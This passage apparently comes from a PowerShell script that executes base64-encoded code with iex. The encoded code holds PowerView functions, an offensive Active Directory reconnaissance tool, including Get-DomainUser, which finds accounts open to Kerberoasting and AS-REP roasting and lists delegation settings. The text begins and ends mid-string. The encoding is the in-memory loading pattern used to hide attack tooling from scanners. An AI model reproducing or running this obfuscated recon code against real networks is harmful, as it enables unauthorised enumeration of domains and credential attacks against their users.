ZWF0ZWQnKQogICAgICAgICRHcm91cFJlZmVyZW5jZVByb3BlcnR5U2V0ID0gQCgnYWRtaW5jb3VudCcsJ2NuJywnZGVzY3JpcHRpb24nLCdkaXN0aW5ndWlzaGVkbmFtZScsJ2RzY29yZXByb3BhZ2F0aW9uZGF0YScsJ2dyb3VwdHlwZScsJ2luc3RhbmNldHlwZScsJ2lzY3JpdGljYWxzeXN0ZW1vYmplY3QnLCdtZW1iZXInLCdtZW1iZXJvZicsJ25hbWUnLCdvYmplY3RjYXRlZ29yeScsJ29iamVjdGNsYXNzJywnb2JqZWN0Z3VpZCcsJ29iamVjdHNpZCcsJ3NhbWFjY291bnRuYW1lJywnc2FtYWNjb3VudHR5cGUnLCdzeXN0ZW1mbGFncycsJ3VzbmNoYW5nZWQnLCd1c25jcmVhdGVkJywnd2hlbmNoYW5nZWQnLCd3aGVuY3JlYXRlZCcpCiAgICAgICAgJENvbXB1dGVyUmVmZXJlbmNlUHJvcGVydHlTZXQgPSBAKCdhY2NvdW50ZXhwaXJlcycsJ2JhZHBhc3N3b3JkdGltZScsJ2JhZHB3ZGNvdW50JywnY24nLCdjb2RlcGFnZScsJ2NvdW50cnljb2RlJywnZGlzdGluZ3Vpc2hlZG5hbWUnLCdkbnNob3N0bmFtZScsJ2RzY29yZXByb3BhZ2F0aW9uZGF0YScsJ2luc3RhbmNldHlwZScsJ2lzY3JpdGljYWxzeXN0ZW1vYmplY3QnLCdsYXN0bG9nb2ZmJywnbGFzdGxvZ29uJywnbGFzdGxvZ29udGltZXN0YW1wJywnbG9jYWxwb2xpY3lmbGFncycsJ2xvZ29uY291bnQnLCdtc2RzLXN1cHBvcnRlZGVuY3J5cHRpb250eXBlcycsJ25hbWUnLCdvYmplY3RjYXRlZ29yeScsJ29iamVjdGNsYXNzJywnb2JqZWN0Z3VpZCcsJ29iamVjdHNpZCcsJ29wZXJhdGluZ3N5c3RlbScsJ29wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrJywnb3BlcmF0aW5nc3lzdGVtdmVyc2lvbicsJ3ByaW1hcnlncm91cGlkJywncHdkbGFzdHNldCcsJ3NhbWFjY291bnRuYW1lJywnc2FtYWNjb3VudHR5cGUnLCdzZXJ2aWNlcHJpbmNpcGFsbmFtZScsJ3VzZXJhY2NvdW50Y29udHJvbCcsJ3VzbmNoYW5nZWQnLCd1c25jcmVhdGVkJywnd2hlbmNoYW5nZWQnLCd3aGVuY3JlYXRlZCcpCiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICRMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Rm9yZXN0ID0gR2V0LURvbWFpbiAtRG9tYWluICREb21haW4gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBGb3Jlc3QgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Rm9yZXN0ID0gR2V0LURvbWFpbiAtRG9tYWluICREb21haW4gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBGb3Jlc3QgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluT2JqZWN0UHJvcGVydHlPdXRsaWVyXSBFbnVtZXJhdGVkIGZvcmVzdCAnJFRhcmdldEZvcmVzdCcgZm9yIHRhcmdldCBkb21haW4gJyREb21haW4nIgogICAgICAgIH0KICAgICAgICAkU2NoZW1hQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTY2hlbWFBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICBpZiAoJFRhcmdldEZvcmVzdCkgewogICAgICAgICAgICAkU2NoZW1hQXJndW1lbnRzWydGb3Jlc3QnXSA9ICRUYXJnZXRGb3Jlc3QKICAgICAgICB9CiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZWZlcmVuY2VQcm9wZXJ0eVNldCddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcl0gVXNpbmcgc3BlY2lmaWVkIC1SZWZlcmVuY2VQcm9wZXJ0eVNldCIKICAgICAgICAgICAgJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMgPSAkUmVmZXJlbmNlUHJvcGVydHlTZXQKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JlZmVyZW5jZU9iamVjdCddKSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpbk9iamVjdFByb3BlcnR5T3V0bGllcl0gRXh0cmFjdGluZyBwcm9wZXJ0eSBuYW1lcyBmcm9tIC1SZWZlcmVuY2VPYmplY3QgdG8gdXNlIGFzIHRoZSByZWZlcmVuY2UgcHJvcGVydHkgc2V0IgogICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9IEdldC1NZW1iZXIgLUlucHV0T2JqZWN0ICRSZWZlcmVuY2VPYmplY3QgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIE5hbWUKICAgICAgICAgICAgJFJlZmVyZW5jZU9iamVjdENsYXNzID0gJFJlZmVyZW5jZU9iamVjdC5vYmplY3RjbGFzcyB8IFNlbGVjdC1PYmplY3QgLUxhc3QgMQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXJdIENhbGN1bGF0ZWQgUmVmZXJlbmNlT2JqZWN0Q2xhc3MgOiAkUmVmZXJlbmNlT2JqZWN0Q2xhc3MiCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXJdIFVzaW5nIHRoZSBkZWZhdWx0IHJlZmVyZW5jZSBwcm9wZXJ0eSBzZXQgZm9yIHRoZSBvYmplY3QgY2xhc3MgJyRDbGFzc05hbWUnIgogICAgICAgIH0KICAgICAgICBpZiAoKCRDbGFzc05hbWUgLWVxICdVc2VyJykgLW9yICgkUmVmZXJlbmNlT2JqZWN0Q2xhc3MgLWVxICdVc2VyJykpIHsKICAgICAgICAgICAgJE9iamVjdHMgPSBHZXQtRG9tYWluVXNlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgaWYgKC1ub3QgJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMpIHsKICAgICAgICAgICAgICAgICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzID0gJFVzZXJSZWZlcmVuY2VQcm9wZXJ0eVNldAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoKCRDbGFzc05hbWUgLWVxICdHcm91cCcpIC1vciAoJFJlZmVyZW5jZU9iamVjdENsYXNzIC1lcSAnR3JvdXAnKSkgewogICAgICAgICAgICAkT2JqZWN0cyA9IEdldC1Eb21haW5Hcm91cCBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgaWYgKC1ub3QgJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMpIHsKICAgICAgICAgICAgICAgICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzID0gJEdyb3VwUmVmZXJlbmNlUHJvcGVydHlTZXQKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCgkQ2xhc3NOYW1lIC1lcSAnQ29tcHV0ZXInKSAtb3IgKCRSZWZlcmVuY2VPYmplY3RDbGFzcyAtZXEgJ0NvbXB1dGVyJykpIHsKICAgICAgICAgICAgJE9iamVjdHMgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgIGlmICgtbm90ICRSZWZlcmVuY2VPYmplY3RQcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICAkUmVmZXJlbmNlT2JqZWN0UHJvcGVydGllcyA9ICRDb21wdXRlclJlZmVyZW5jZVByb3BlcnR5U2V0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIHRocm93ICJbRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXJdIEludmFsaWQgY2xhc3M6ICRDbGFzc05hbWUiCiAgICAgICAgfQogICAgICAgIEZvckVhY2ggKCRPYmplY3QgaW4gJE9iamVjdHMpIHsKICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXMgPSBHZXQtTWVtYmVyIC1JbnB1dE9iamVjdCAkT2JqZWN0IC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZCBOYW1lCiAgICAgICAgICAgIEZvckVhY2goJE9iamVjdFByb3BlcnR5IGluICRPYmplY3RQcm9wZXJ0aWVzKSB7CiAgICAgICAgICAgICAgICBpZiAoJFJlZmVyZW5jZU9iamVjdFByb3BlcnRpZXMgLU5vdENvbnRhaW5zICRPYmplY3RQcm9wZXJ0eSkgewogICAgICAgICAgICAgICAgICAgICRPdXQgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTYW1BY2NvdW50TmFtZScgJE9iamVjdC5TYW1BY2NvdW50TmFtZQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnUHJvcGVydHknICRPYmplY3RQcm9wZXJ0eQogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVmFsdWUnICRPYmplY3QuJE9iamVjdFByb3BlcnR5CiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuUHJvcGVydHlPdXRsaWVyJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblVzZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlRGVjbGFyZWRWYXJzTW9yZVRoYW5Bc3NpZ25tZW50cycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlVzZXInKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuVXNlci5SYXcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKERlZmF1bHRQYXJhbWV0ZXJTZXROYW1lID0gJ0FsbG93RGVsZWdhdGlvbicpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdEaXN0aW5ndWlzaGVkTmFtZScsICdTYW1BY2NvdW50TmFtZScsICdOYW1lJywgJ01lbWJlckRpc3Rpbmd1aXNoZWROYW1lJywgJ01lbWJlck5hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNQTiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRBZG1pbkNvdW50LAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdBbGxvd0RlbGVnYXRpb24nKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRBbGxvd0RlbGVnYXRpb24sCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0Rpc2FsbG93RGVsZWdhdGlvbicpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJERpc2FsbG93RGVsZWdhdGlvbiwKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUcnVzdGVkVG9BdXRoLAogICAgICAgIFtBbGlhcygnS2VyYmVyb3NQcmVhdXRoTm90UmVxdWlyZWQnLCAnTm9QcmVhdXRoJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUHJlYXV0aE5vdFJlcXVpcmVkLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRQcm9wZXJ0aWVzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtWYWxpZGF0ZVNldCgnRGFjbCcsICdHcm91cCcsICdOb25lJywgJ093bmVyJywgJ1NhY2wnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWN1cml0eU1hc2tzLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbQWxpYXMoJ1JldHVybk9uZScpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEZpbmRPbmUsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJhdwogICAgKQogICAgRHluYW1pY1BhcmFtIHsKICAgICAgICAkVUFDVmFsdWVOYW1lcyA9IFtFbnVtXTo6R2V0TmFtZXMoJFVBQ0VudW0pCiAgICAgICAgJFVBQ1ZhbHVlTmFtZXMgPSAkVUFDVmFsdWVOYW1lcyB8IEZvckVhY2gtT2JqZWN0IHskXzsgIk5PVF8kXyJ9CiAgICAgICAgTmV3LUR5bmFtaWNQYXJhbWV0ZXIgLU5hbWUgVUFDRmlsdGVyIC1WYWxpZGF0ZVNldCAkVUFDVmFsdWVOYW1lcyAtVHlwZSAoW2FycmF5XSkKICAgIH0KICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VjdXJpdHlNYXNrcyddID0gJFNlY3VyaXR5TWFza3MgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJFVzZXJTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnMgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzLkNvdW50IC1uZSAwKSkgewogICAgICAgICAgICBOZXctRHluYW1pY1BhcmFtZXRlciAtQ3JlYXRlVmFyaWFibGVzIC1Cb3VuZFBhcmFtZXRlcnMgJFBTQm91bmRQYXJhbWV0ZXJzCiAgICAgICAgfQogICAgICAgIGlmICgkVXNlclNlYXJjaGVyKSB7CiAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAkSWRlbnRpdHkgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdeUy0xLScpIHsKICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihvYmplY3RzaWQ9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtbWF0Y2ggJ15DTj0nKSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSAtYW5kICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICRJZGVudGl0eURvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkVXNlclNlYXJjaGVyID0gR2V0LURvbWFpblNlYXJjaGVyIEBTZWFyY2hlckFyZ3VtZW50cwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoLW5vdCAkVXNlclNlYXJjaGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpblVzZXJdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4nIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZSAtaW1hdGNoICdeWzAtOUEtRl17OH0tKFswLTlBLUZdezR9LSl7M31bMC05QS1GXXsxMn0kJykgewogICAgICAgICAgICAgICAgICAgICRHdWlkQnl0ZVN0cmluZyA9ICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7ICdcJyArICRfLlRvU3RyaW5nKCdYMicpIH0pIC1qb2luICcnCiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIob2JqZWN0Z3VpZD0kR3VpZEJ5dGVTdHJpbmcpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZWlmICgkSWRlbnRpdHlJbnN0YW5jZS5Db250YWlucygnXCcpKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UgPSAkSWRlbnRpdHlJbnN0YW5jZS5SZXBsYWNlKCdcMjgnLCAnKCcpLlJlcGxhY2UoJ1wyOScsICcpJykgfCBDb252ZXJ0LUFETmFtZSAtT3V0cHV0VHlwZSBDYW5vbmljYWwKICAgICAgICAgICAgICAgICAgICBpZiAoJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJEb21haW4gPSAkQ29udmVydGVkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoMCwgJENvbnZlcnRlZElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignLycpKQogICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSAkSWRlbnRpdHlJbnN0YW5jZS5TcGxpdCgnXCcpWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKHNhbUFjY291bnROYW1lPSRVc2VyTmFtZSkiCiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEV4dHJhY3RlZCBkb21haW4gJyRVc2VyRG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZSciCiAgICAgICAgICAgICAgICAgICAgICAgICRVc2VyU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkSWRlbnRpdHlGaWx0ZXIgLWFuZCAoJElkZW50aXR5RmlsdGVyLlRyaW0oKSAtbmUgJycpICkgewogICAgICAgICAgICAgICAgJEZpbHRlciArPSAiKHwkSWRlbnRpdHlGaWx0ZXIpIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NQTiddKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbR2V0LURvbWFpblVzZXJdIFNlYXJjaGluZyBmb3Igbm9uLW51bGwgc2VydmljZSBwcmluY2lwYWwgbmFtZXMnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcoc2VydmljZVByaW5jaXBhbE5hbWU9KiknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQWxsb3dEZWxlZ2F0aW9uJ10pIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluVXNlcl0gU2VhcmNoaW5nIGZvciB1c2VycyB3aG8gY2FuIGJlIGRlbGVnYXRlZCcKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyghKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xMDQ4NTc0KSknCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGlzYWxsb3dEZWxlZ2F0aW9uJ10pIHsKICAgICAgICAgICAgICAgIFdy